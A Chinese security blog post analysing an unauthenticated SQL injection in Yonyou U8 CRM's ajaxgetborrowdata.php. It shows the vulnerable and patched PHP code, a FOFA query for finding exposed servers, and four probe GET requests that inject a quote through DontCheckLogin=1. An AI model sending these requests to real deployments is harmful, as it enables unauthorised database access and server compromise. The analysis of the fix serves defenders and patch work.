---
title: "用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞"
source: https://mrxn.net/jswz/yonyon-u8crm-borrowout-ajaxgetborrowdata-sqli.html
asset_dir: assets/用友u8-crm-ajaxgetborrowdata.php-sql注入漏洞
---

# 用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/8 08:31
* 1067浏览
* [0评论](#comment)
* 56分钟阅读

深入探索

鉴权

客户关系

CRM


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

用友U8 CRM[客户关系管理](#)系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务。用友 U8 CRM客户关系管理系统 ajaxgetborrowdata.php 文件存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp\_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

客户关系管理

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V13

# fofa语法

> `title="用友U8CRM"`

# 漏洞分析

深入探索

技术文章订阅

安全研究工具

计算机安全

根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)通告

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-001-4f6b7b32de12.webp)](https://image.mrxn.net/66502f10c66349b5922fb675fb5d1a52.webp)

可知漏洞原因为sql注入导致的命令注入攻击。

SQL注入防护

深入探索

安全工具开发

漏洞扫描器

Windows安全工具

那直接看 `U8SOFT/turbocrm70/code/www/borrowout/ajaxgetborrowdata.php` 修复前后的差异

当 `Action=getCusInfo` 时

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-002-f2fb7f47ed4d.webp)](https://image.mrxn.net/746347434d524436b9336587f3656b7a.webp)

可以看到修复版本删除了拼接 `cus` 进sql语句部分，以及当 `Action=getWarehouseOtherInfo` 时

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-003-338a62f16085.webp)](https://image.mrxn.net/922c3ef83ade426cab557368a0ea6ea6.webp)

```
case "getWarehouseOtherInfo": 
        $bWhPos='0';  ;
        try
        {     
            $cWhCode = isset ($_GET['cWhCode'])?$_GET['cWhCode']:$_POST['cWhCode'] ;
            //$sql="select case when bWhPos = 1 then '1' else '0' end bWhPos  from Warehouse  where cWhCode ='".$cWhCode."'";
            //$rs = $gblDB->query($sql);
            $stmt = new TSQLStmt();
            $stmt->Table('Warehouse','a');
            $stmt->Select('a','bWhPos');
            $stmt->Cond("a","cWhCode",$cWhCode);
            $sql = $stmt->SQLGen();
            $rs = $gblDB->Query($sql);
```

是对 `cWhCode` 进行参数化查询处理，而不是直接拼接进SQL语句中，以及当 `Action=ChangeIexchrate` 时

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-004-bca6893df514.webp)](https://image.mrxn.net/a9cf5ff209ae4b648d7da9902e59e6e0.webp)

```
case "ChangeIexchrate": 
        $uflogin = $gblObj->getUfLogin() ;
        $dbc = $uflogin->UfCurrentDb(); 
        $Crrency = isset ($_GET['Crrency'])?$_GET['Crrency']:$_POST['Crrency'] ;
//      $sql = "select * from foreigncurrency where cexch_name = '".$Crrency."'";
//      $rs = $gblDB->query($sql);
        $stmt = new TSQLStmt();
        $stmt->Table('foreigncurrency','a');
        $stmt->Select('a','iotherused');
        $stmt->Cond("a","cexch_name",$Crrency);
        $sql = $stmt->SQLGen();
        $rs = $gblDB->Query($sql);
```

可以看到没有修复之前是直接将 `Crrency` 拼接进sql语句中，无任何过滤和校验，造成[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

以及当 `Action=getCusPrice` 时

```
case "getCusPrice": 
        $UpAutoID = isset ($_GET['i'])?$_GET['i']:$_POST['i'] ;
        $inum = isset ($_GET['n'])?$_GET['n']:$_POST['n'] ;
        $iquantity = isset ($_GET['q'])?$_GET['q']:$_POST['q'] ;
        $itaxrate = isset ($_GET['t'])?$_GET['t']:$_POST['t'] ;
        $iinvexchrate = isset ($_GET['c'])?$_GET['c']:$_POST['c'] ;
        $bObjectCode = isset ($_GET['cus'])?$_GET['cus']:$_POST['cus'] ; 
        $itax1 = isset ($_GET['x'])?$_GET['x']:$_POST['x'] ;
        $iexchrate = isset ($_GET['r'])?$_GET['r']:$_POST['r'] ;
        $Currency = isset ($_GET['m'])?$_GET['m']:$_POST['m'] ; 

        if (empty($UpAutoID)) $UpAutoID = 0;
        if (empty($inum)) $inum = 1;
        if (empty($iquantity)) $iquantity = 1;
        if (empty($itaxrate)) $itaxrate = 17;
        if (empty($iinvexchrate)) $iinvexchrate = 1;
        if (empty($itax1)) $itax1 = 17;
        if (empty($iexchrate)) $iexchrate = 1;
//      if (!empty($Currency)) $Currency = crmChar($Currency);
        if (!empty($bObjectCode)) $bObjectCode = substr($bObjectCode,1);
        $cBusType = crmChar("普通销售");
        $arr=array();   
        if (trim($UpAutoID)!="")
        {
            $tmpTablNamehead = "tmpCrmBorrowChangeHead".mt_rand(100000,999999) ;
            $tmpTablNamebady = "tmpCrmBorrowChangeBady".mt_rand(100000,999999) ;

            $strHeadsql="select N'".$cBusType."' AS cBusType,N'' AS cSTCode,N'' AS cSTName, ";
            $strHeadsql=$strHeadsql."  ".$iexchrate." AS itax1, N'' AS crdcode, N'' AS rrdcode, N'' as ccoutname, " ;
            $strHeadsql=$strHeadsql."  ID,cCODE,cType,(select top 1 cCusCode from Customer  where cCusCode='".$bObjectCode."' or cCusAbbName='".$bObjectCode."' or cCusName='".$bObjectCode."'  ) as bObjectCode,cpersoncode,cdepcode,cmemo,cMaker,cHandler,CloseUser,N'".$Currency."' as cexch_name, ";
            $strHeadsql=$strHeadsql."  ".$iexchrate." as iexchrate,IntoUser,iverifystate,ddate,dVeriDate,dCloseDate,dmDate,dIntoDate,iStatus, ";  
            $strHeadsql=$strHeadsql."  (select top 1 cCusName from Customer  where cCusCode='".$bObjectCode."' or cCusAbbName='".$bObjectCode."' or cCusName='".$bObjectCode."'  ) as bObjectName,iswfcontrolled,ireturncount,cdefine1,cdefine2,cdefine3,cdefine5,cdefine7, ";
            $strHeadsql=$strHeadsql."  cdefine8,cdefine9,cdefine10,cdefine11,cdefine12,cdefine13,cdefine14,cdefine15,cdefine16, ";
            $strHeadsql=$strHeadsql."  cdefine4,cdefine6,ufts,cCreateType,cContactperson,cContactWay,cfreight,cfreightType,cfreightCompany, ";
            $strHeadsql=$strHeadsql."  cfreightCost,cAboutVoucher,cCodeAboutVoucher,MycdefineT1,MycdefineT2,MycdefineT3,MycdefineT4, ";
            $strHeadsql=$strHeadsql."  MycdefineT5,MycdefineT6,MycdefineT7,MycdefineT8,MycdefineT9,MycdefineT10,DownstreamCode, ";
            $strHeadsql=$strHeadsql."  UpStreamCode,cdepname,cpersonname,bObjectName2,bObjectCode2,cVoucherId,VoucherId,VoucherCode, ";
            $strHeadsql=$strHeadsql."  VoucherType,bCusDomestic,cborrowouttype,soType into ".$tmpTablNamehead." ";
            $strHeadsql=$strHeadsql."  from V_HY_DZ_BorrowOutPrice_CRM where ID= (select top 1 ID from HY_DZ_BorrowOutS where AutoID = '".$UpAutoID."')";
```

`$UpAutoID` 也是直接拼接进SQL语句中，造成sql注入漏洞。

代码安全审计

# 漏洞复现

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusInfo&cus=' HTTP/1.1
Host: u8crm.mrxn.net
```

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo&cWhCode=' HTTP/1.1
Host: u8crm.mrxn.net
```

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=ChangeIexchrate&Crrency=' HTTP/1.1
Host: u8crm.mrxn.net
```

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusPrice&i=' HTTP/1.1
Host: u8crm.mrxn.net
```

# 参考

* `https://security.yonyou.com/#/patchInfo?identifier=dbed49af1ced41e89fcc67d35e5df6c9`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](https://mrxn.net/jswz/yonyon-u8crm-borrowout-ajaxgetborrowdata-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyon-u8crm-borrowout-ajaxgetborrowdata-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALjElEQVR4Aeyb0XbbOAxEffv//9wtMntlESItp01iPyhn0eEMBiBNyE3rZn/dbrfffxO/21fv0dLbHiv92fru23N7q8k7mhd7Xn6WX/ms+xusgfypu/57lxvYBvJn2rdnYnXwXgvcgM1uXgH4yKuL5leoT1z5SofsUesKCO+1EL08FRCuD8JhjlUzC+vPcF+7DWQvXuvX3cBhIPC5p8Cjw1in3hHi86kxD3+nW7/H3tvcZ3XImawXV33Md4T0gRG7r/hhICVe8bob+LKB+NR0hMdPBSRvHYRD8OxqrCvUC6ktrUK9Y+UqIH4Idp+8vBVysbQK+b/glw3kXw5x1d5v4J8HAvOnCqLXkzMLGPMeaeYtDeKHoH4IhzuucuoipEYu1n4VchFGf3kqzH8F/vNAvuIQV4/7DRwGUhOfxb1kXOlVBW78CXUYnyoIN29dR4hPvfvlM1zVqEN691rz4ioPqdd3hr2PfFZ3GMjMdGk/dwPbQCBTh8fYjwbxd/1ZDmM9hPsUQfiqHyQPrCynOjB8agDhFkK4Z1IXIXm5CNHhMeov3AZS5IrX38Avp/5Z7EeHPAX2gZGf+Vf5rnfufoU9BzmDOsx51VZA8rWusK7WFXIR4peL5f3buN4h3uKb4GEgkKlDsJ8TokOw51cc5n6IDkGfrN4HkleHcDiinjPse8khPVf1+szLIXUQNA8jV5/hYSAz06X93A38gkwPgk7bI0B0ec+rixB/93WuvyOkXt06caVXvufkHctb0XV55SogZ4ERu0/eEVJXvSogXB+MvPTrHVK38EaxDaQmWAHj1EqrgOgQXL2G8lbA3Fe5il5f2ixg6/NRoueDPPnLWQ2Me8DIV/UQHwTPjmMfiF++r9sGshev9etu4DCQPjXIND1iz8vFlQ/SB4L6RYgOwd4HokPQ/B57rzMOYy8It06E6Pu9Hq2t0wOph+BKB26Hgdyur5fewPY3dU8B4xTVnTrM8/pgnrdehMc+GPPWuY8I8cEdzYmrWnVRvwjpKT9D+8BYp76qN194vUNWt/Qi/TCQmlKF56l1BWTqta4wL0Ly8o4w5qtHBYz6WZ15SF31MMzJIR4Imhdhrpu3T0dIXddXdRC/+Y6QPHB9D7m92dfhHQKZltOHcM8Nc65/5TMPqYegeq/runl1UX2GekQY91zps16lQepr/SggPgiuvO6/x8NAVsWX/jM3cBiI03L7FVcXV351yNOiX4TndIgPgr0vsP1ssrmO7qkO3PgTchGyBwTVO0LyEOz5vp9c7P7ih4GUeMXrbuAwEMi0YUSPCHO9530KIH7zIow6hEOw18tFiM9+e4R5DkbdXvva/brn5aLeFYdxP/0w6hAOXH/Kur3Z1+m/h6ymrw736QLbywM+fpJDQb+841kexn7WW1fYNUgNBMtToa8jjD4I/1tf7VXR60ur6Hrxw29ZJV7xuhvYBlITq4DxqYA5h+hV80z0l2iNOoz9INy8CKMO4YCWj3cmnP+pC/jwboWLBYy+fnY5xAcj2hair3jp20CKXPH6G1gOxKmLHlUuQqYOI+rvCPGp20cOY169++R7PPOa77jvUWvIGWpdoR+iy1dYNRXma10hf4TLgTwqunLfdwOnA4HxqYBwCK6OBsnDiPWkVKzqKldhvtYV8o5w799zncPdC/fvMRB95a/99wFzv57b7fbRqvMP8eSX04Gc1F/pL76B5UDgc09BfxpWHNIXgs++Hoh/1bf03gtSA8HyVHRfaRXqta6Qd6xcRdch+0Cw56umQr3WPZYDsejCn72BbSAwn2o/Dow+GHn3+wTA3AejDs9xiA/W6N6iZ5PDWGseonef+Y4Q/0qH5CHYfXu+DWQvXuvX3cD2Uyc+DaujmO+48sP8abC+16mL5uXiSjdfqEeEnAWC6uXdBySvpk+E5CGoLlrX0bwI8/rKX++QuoU3isOnvWdng/l0YdR9SmDUIdy86L4w5iEcgvpEiA4obQg89VnVVvD/AlIHwf/l03+R1AdjnXp/rep7vN4h+9t4g/U1kDcYwv4I20D626l4xd5c69Iqav0oIG/b8s4CkoegvfTKxTO98nrF0mYB2RNGPKszf4bu2X2Q/dQhHO64DUTTha+9gW0gkCmtjgPJw4j6fSpEdRFSJxf1Q/Iwonn9Iow+uHM9IiQn77jaQx+kHoLqHSF5GLH7Onf/wm0g3XTx19zANpCaToXHgEy5tAr1WlfIO8JYByPXXz0qOi9tH+ZFc/I9Pso98kHOuPfUGqI/27dqKrpfvkLIPsD1Y0C3N/vaPjqBTKlPEaJ7bhi5umg9jD4YuX4YdQiHEfWL7rNHSI0ahFsDI1cXe53c/Aq7D7KPOoTDiPbTV7j9lmXywtfewPbRSU2noh+ntAr1Ws/CvDjzlAZ5SrpPLpa3Qg6pgzWWv8KajpWrWOmQ3uZh5FW7D0geguasP0NIHdzxeoec3doP5w/fQ+A+LWA7jtMHPj6wg6AGGLm6CMn//v3740M69Y7uoy4XV3rlzYml7QNyhp6HUTe/Qoh/37vWEH1VV559zHzXO2R2Ky/UDt9D9hOsNYxTL20fnl0N4oeg+TOE+GFE6yC6+6jPEOI1B+FnteZF6zuah/SFoLp+GHUINz/D6x0yu5UXasuBQKbp1CEcgs+eGeJf9YExr0882wdSDxyswMf3OxMwcvUzhNRBUP/qjF2Hsa7X6y9cDsSiC3/2Bj49kJpiBWTqMGLlKnwZta6A+Gpd0fPyM4T0geDMX/0rzNW6Qg7rWj2FVbOP0mahB+Z9zYsw91XvTw+kiq74vhv49EAg03XaokeE5Dvvvs71n+GjOsjeELQXjLzrvSeMfgjvvrM+5kVIH/kMPz2QWZNL+7ob2AYCmR4E3QJG7lMC0SGov6N+dYgf5qhPhPh6H7m4R2ufRcge+u0Fo24eokOw+2HUresI8cEdt4F088VfcwPbZ1l9e6fedcg01fWJXZfDWKfe69Rh9MNjXnUQT+/ZeXn3cZbXC/P+MNfP6szv8XqH7G/jDdZPD8SnqGN/DeYhT80q3/Uzbl99csg+cP6/qPVae6h3XOUhe+rvvs71wVinvsenB7IvutbfdwOHgfTpyiHThaBHgjnvdWfcfh2t6/qMQ85ijQjRZzWlweO8fcSqqegcxj4Qrk+s2n2oFx4Gsjde65+/gcNAIFOFoEeq6e0DxjyE64GR20eE5OVnCJ/z7/t5pr1Waxh7wsjLM4tVv5VuD0j/R77DQCy+8DU3sP2LYd9+NUXIlPWvfOYhfgiqn6F9IXWdQ/RZH0gOgjPPc9rogvSDoFkIhxF73tegLod73fUO8XbeBLe/qTstcXU+8yJkut1vvuty86I6jP16Xp/6DLsHxp493znEDyOufF3vZzIP837mC693SN3CG8X2PQTG6cFj3l+DTwWMdfrMy2H0neWt6wj3PqvcZ3t3f+8rX/kgZ9LX0To4+q53SL+tF/NtIE7tDPt59cNx2t1bXH+t9wHz+pXfWvOFamJpFTDvvfLBY791K6w9K1b5R/o2kEemK/dzN3AYCOTpgBGfPVI9GRX6a10h71i5fZhXk3eE8Xxw53ohmr1E8yt+pkP62keE6DCi+WfwMJBnii7P993APw8E8jT4VEG4R4aRq3eE0Qcj1+8+nZc+00qHsVdpFRAdRux95BBf1VbAyEur0N+xchXqta6QF/7zQKrJFV93A982kJp8hUeFPE0QrFyF+VrPAuLXJ+qF5AFTSwQ+ftYXghrtJULyEOw+uQhzn/30rVBf4bcNZLX5pT++gcNAakqzWLXRC3lKVlzdPhB/5zDqPb/ipbsHjD3Uy1PROTz2w5iHcPuIEL322Id5NZj7Kn8YSIlXvO4GtoFApgaPcXXU/hR0H6SvPlFf5xD/Kt/1qoexBsIhWJ4Ka8XSKuQrhPTpeXhOh9EH4XDHbSB9k4u/5gaugbzm3pe7/gcAAP//YlgdmwAAAAZJREFUAwACNIC8xl2JRQAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyon-u8crm-borrowout-ajaxgetborrowdata-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALjElEQVR4Aeyb0XbbOAxEffv//9wtMntlESItp01iPyhn0eEMBiBNyE3rZn/dbrfffxO/21fv0dLbHiv92fru23N7q8k7mhd7Xn6WX/ms+xusgfypu/57lxvYBvJn2rdnYnXwXgvcgM1uXgH4yKuL5leoT1z5SofsUesKCO+1EL08FRCuD8JhjlUzC+vPcF+7DWQvXuvX3cBhIPC5p8Cjw1in3hHi86kxD3+nW7/H3tvcZ3XImawXV33Md4T0gRG7r/hhICVe8bob+LKB+NR0hMdPBSRvHYRD8OxqrCvUC6ktrUK9Y+UqIH4Idp+8vBVysbQK+b/glw3kXw5x1d5v4J8HAvOnCqLXkzMLGPMeaeYtDeKHoH4IhzuucuoipEYu1n4VchFGf3kqzH8F/vNAvuIQV4/7DRwGUhOfxb1kXOlVBW78CXUYnyoIN29dR4hPvfvlM1zVqEN691rz4ioPqdd3hr2PfFZ3GMjMdGk/dwPbQCBTh8fYjwbxd/1ZDmM9hPsUQfiqHyQPrCynOjB8agDhFkK4Z1IXIXm5CNHhMeov3AZS5IrX38Avp/5Z7EeHPAX2gZGf+Vf5rnfufoU9BzmDOsx51VZA8rWusK7WFXIR4peL5f3buN4h3uKb4GEgkKlDsJ8TokOw51cc5n6IDkGfrN